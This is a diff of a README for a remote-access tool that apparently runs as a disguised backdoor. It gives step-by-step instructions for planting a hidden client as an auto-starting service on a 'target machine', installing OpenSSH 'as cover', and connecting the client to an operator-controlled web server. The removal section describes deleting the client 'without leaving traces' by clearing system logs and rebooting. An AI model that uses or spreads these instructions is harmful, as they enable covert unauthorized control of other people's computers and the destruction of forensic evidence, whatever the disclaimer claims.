@@ -26,58 +26,82 @@ A web-based remote command execution system with SSH disguise capabilities. This
 
 ## Installation
 
-### Server Setup
+### Universal Server Setup (Works on Any System)
 
 1. **Navigate to server directory:**
    ```bash
    cd server/
    ```
 
-2. **Make the startup script executable:**
+2. **Run the universal startup script:**
    ```bash
-   chmod +x start.sh
+   ./start_universal.sh
    ```
 
-3. **Start the server:**
-   ```bash
-   ./start.sh
-   ```
-
-4. **Access the web interface:**
+3. **Access the web interface:**
    Open your browser to `http://localhost:5000`
 
-### Client Setup (Target Machine)
+The universal script will:
+- Detect your system automatically
+- Install Python dependencies
+- Create virtual environment if possible
+- Set up all necessary paths
+- Start the server with proper configuration
+
+### Universal Client Setup (Works on Any Linux System)
 
 1. **Copy client files to target machine:**
    ```bash
    scp -r client/ user@target-machine:/tmp/
    ```
 
-2. **On the target machine, navigate to client directory:**
+2. **On the target machine:**
    ```bash
    cd /tmp/client/
    ```
 
-3. **Update the server URL in ssh_client.py:**
-   ```python
+3. **Run the universal installer:**
+   ```bash
+   # For system-wide installation (recommended):
+   sudo ./install_universal.sh
+   
+   # For user-only installation:
+   ./install_universal.sh
+   ```
+
+4. **Update server URL:**
+   ```bash
+   # Edit the configuration file
+   nano ~/.local/share/ssh-client/config.py  # (user install)
+   # or
+   nano /usr/share/ssh-client/config.py      # (system install)
+   
+   # Change SERVER_URL to your server's IP
    SERVER_URL = "http://YOUR_SERVER_IP:5000"
    ```
 
-4. **Make installation script executable:**
-   ```bash
-   chmod +x install.sh
-   ```
+The universal installer will:
+- Detect your Linux distribution
+- Install SSH client as cover
+- Set up Python environment
+- Install as system service
+- Create management tools
+- Work with or without sudo privileges
 
-5. **Run the installation (requires sudo):**
-   ```bash
-   sudo ./install.sh
-   ```
+### Quick System Test
 
-This will:
-- Install legitimate OpenSSH client (as cover)
-- Install the hidden remote client as a system service
-- Set up auto-start capabilities
-- Create the necessary directory structure
+Run the universal test script to verify compatibility:
+```bash
+./test_universal.sh
+```
+
+This will check:
+- Python environment
+- Package managers
+- Network connectivity
+- File permissions
+- Port availability
+- System compatibility
 
 ## Usage
 
@@ -292,3 +316,65 @@ This project is for educational purposes only. Use responsibly and only on syste
 ## Disclaimer
 
 This tool is designed for educational purposes and authorized security testing only. The authors are not responsible for any misuse or damage caused by this software. Always ensure you have proper authorization before using this tool on any system.
+
+### Client Removal
+
+The server includes a built-in client removal system that can completely remove clients without leaving traces:
+
+#### From Web Interface
+1. Navigate to the Dashboard
+2. Find the client you want to remove
+3. Click "🗑️ Remove Client"
+4. Confirm the action (this will reboot the target machine)
+
+#### Automatic Removal Script
+The system automatically includes a removal script that:
+- Stops all client services
+- Removes all installed files
+- Clears system logs
+- Removes autostart entries
+- Cleans temporary files
+- Reboots the machine for complete cleanup
+
+#### Manual Removal
+For advanced users, use the standalone removal script:
+```bash
+# On the target machine
+./scripts/advanced_removal.sh
+```
+
+## Docker Deployment
+
+### Coolify Deployment
+
+1. **Prepare for deployment:**
+   ```bash
+   ./deploy-coolify.sh
+   ```
+
+2. **Update domain in docker-compose.yml:**
+   ```yaml
+   - "traefik.http.routers.remote-command.rule=Host(`your-domain.com`)"
+   ```
+
+3. **Push to Git and deploy in Coolify**
+
+### Manual Docker Deployment
+
+1. **Build and run:**
+   ```bash
+   docker-compose up -d
+   ```
+
+2. **Access at http://localhost:5000**
+
+### Environment Variables
+
+```bash
+FLASK_ENV=production
+FLASK_DEBUG=false
+FLASK_HOST=0.0.0.0
+FLASK_PORT=5000
+DB_PATH=/app/data/remote_commands.db
+LOG_FILE=/app/logs/app.log
+```
